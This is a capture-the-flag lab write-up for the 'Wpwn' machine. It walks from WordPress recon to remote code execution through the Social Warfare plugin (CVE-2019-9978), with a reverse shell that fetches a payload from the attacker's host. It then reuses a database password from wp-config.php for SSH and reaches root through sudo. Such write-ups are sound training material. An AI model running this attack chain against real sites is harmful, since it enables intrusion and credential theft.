---
title: Wpwn
parent: Proving Grounds Play
grand_parent: Writeups
nav_order: 5
---
# Wpwn
## OS
## Level

---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ whatweb -a 3 http://192.168.134.123
http://192.168.134.123 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.134.123]
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ curl -I http://192.168.134.123                                 
HTTP/1.1 200 OK
Date: Tue, 12 May 2026 20:27:10 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Mon, 14 Dec 2020 13:24:24 GMT
ETag: "17-5b66c8f90d927"
Accept-Ranges: bytes
Content-Length: 23
Content-Type: text/html
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ nmap -Pn -p- -sCV -A -oN full_scan.txt -open 192.168.134.123 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 05:22 +0900
Nmap scan report for 192.168.134.123
Host is up (0.081s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:b7:db:e0:ba:63:76:af:d0:20:03:11:e1:3c:0e:34 (RSA)
|   256 2e:20:56:75:84:ca:35:ce:e3:6a:21:32:1f:e7:f5:9a (ECDSA)
|_  256 0d:02:83:8b:1a:1c:ec:0f:ae:74:cc:7b:da:12:89:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   79.68 ms 192.168.45.1
2   79.43 ms 192.168.45.254
3   79.76 ms 192.168.251.1
4   79.78 ms 192.168.134.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.76 seconds
```

![](../../../assets/images/Pasted%20image%2020260513053153.png)

```zsh

```
![](../../../assets/images/Pasted%20image%2020260513054617.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ feroxbuster \
-u http://192.168.134.123 \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \ 
-x html,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt

[####################] - 4m     68985/68985   0s      found:222     errors:5      
[####################] - 2m     33257/33257   284/s   http://192.168.134.123/ 
[####################] - 2m     33257/33257   280/s   http://192.168.134.123/wordpress/ 
```
wordpress

![](../../../assets/images/Pasted%20image%2020260513055239.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ wpscan --url http://192.168.134.123/wordpress/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.134.123/wordpress/ [192.168.134.123]
[+] Started: Wed May 13 05:49:25 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.134.123/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.134.123/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.134.123/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.134.123/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.134.123/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5</generator>
 |  - http://192.168.134.123/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://192.168.134.123/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.134.123/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://192.168.134.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.134.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] social-warfare
 | Location: http://192.168.134.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2025-03-18T09:37:00.000Z
 | [!] The version is out of date, the latest version is 4.5.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.134.123/wordpress/, Match: 'Social Warfare v3.5.2'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.134.123/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.134.123/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.134.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.134.123/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=====================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed May 13 05:49:44 2026
[+] Requests Done: 172
[+] Cached Requests: 5
[+] Data Sent: 46.921 KB
[+] Data Received: 403.007 KB
[+] Memory used: 269.93 MB
[+] Elapsed time: 00:00:19
```
worpres version 5.5
social warfare 3.5.2

![](../../../assets/images/Pasted%20image%2020260513060403.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ wpscan --url http://192.168.134.123/wordpress --enumerate u

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.134.123/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

```zsh
┌──(kali㉿kali)-[~/github/Dr-Hakas3/CheatSheets]
└─$ wpprobe scan -u http://192.168.147.123/wordpress -v
```
![](../../../assets/images/Pasted%20image%2020260513232712.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ searchsploit social warfare 3.5.2
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)               | multiple/webapps/52346.py
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                   | php/webapps/46794.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ searchsploit -m 52346
  Exploit: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52346
     Path: /usr/share/exploitdb/exploits/multiple/webapps/52346.py
    Codes: CVE-2019-9978
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/CTF/OffSec/Wpwn/52346.py
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ vi 52346.py
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ python3 52346.py
[+] Payload written to payload.txt
[+] HTTP server running at port 8000
[+] Listening on port 4444 for reverse shell...
listening on [any] 4444 ...
[+] Sending exploit: http://192.168.147.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.180:8000/payload.txt
192.168.147.123 - - [13/May/2026 23:18:17] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -
connect to [192.168.45.180] from (UNKNOWN) [192.168.147.123] 51358
bash: cannot set terminal process group (523): Inappropriate ioctl for device
bash: no job control in this shell
www-data@wpwn:/var/www/html/wordpress/wp-admin$  
```

```zsh
www-data@wpwn:/var/www$ cat local.txt
cat local.txt
```

---
# Privilege Escalation

```zsh
www-data@wpwn:/var/www/html/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@wpwn:/var/www/html/wordpress/wp-admin$ hostname
hostname
wpwn
```

```zsh
ww-data@wpwn:/var/www/html/wordpress/wp-admin$ uname -ar
uname -ar
Linux wpwn 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
```

```zsh
www-data@wpwn:/var/www/html/wordpress/wp-admin$ cat /home/takis/user.txt
cat /home/takis/user.txt
Your flag is in another file...
```

```zsh
www-data@wpwn:/var/www/html/wordpress/wp-admin$ cat ../wp-config.php
cat ../wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'wp_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```
![](../../../assets/images/Pasted%20image%2020260514000501.png)

```zsh

```
![](../../../assets/images/Pasted%20image%2020260514000650.png)
```zsh
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3203 Aug 17  2020 /var/www/html/wordpress/wp-config.php                              
define( 'DB_NAME', 'wordpress_db' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );
define( 'DB_HOST', 'localhost' );
```
![](../../../assets/images/Pasted%20image%2020260514000731.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ mysql -u wp_user -h 240.0.0.1 -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 66
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

```zsh
MariaDB [(none)]> use wordpress_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress_db]> show tables;
+------------------------+
| Tables_in_wordpress_db |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+------------------------+
12 rows in set (0.080 sec)

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url                         | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BoIPbgc5i8WpBP2HzqoeQW3jfRVAyU1 | admin         | unknown@uknown.1337 | http://192.168.147.123/wordpress | 2020-08-17 23:26:45 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.080 sec)
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ hashcat -m 400 -a 0 admin.hash /usr/share/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/best66.rule
```
*This is rabbit hole.*

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ ssh takis@192.168.147.123                  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
takis@192.168.147.123's password: 
Linux wpwn 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 13 11:57:49 2026 from 192.168.45.180
```
PW:       R3&]vzhHmMn9,:-5


```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Wpwn]
└─$ ssh takis@192.168.147.123                  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
takis@192.168.147.123's password: 
Linux wpwn 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 13 11:57:49 2026 from 192.168.45.180
```

```zsh
takis@wpwn:~$ sudo -l
Matching Defaults entries for takis on wpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User takis may run the following commands on wpwn:
    (ALL) NOPASSWD: ALL
```

```zsh
takis@wpwn:~$ sudo su
root@wpwn:/home/takis# id
uid=0(root) gid=0(root) groups=0(root)
```
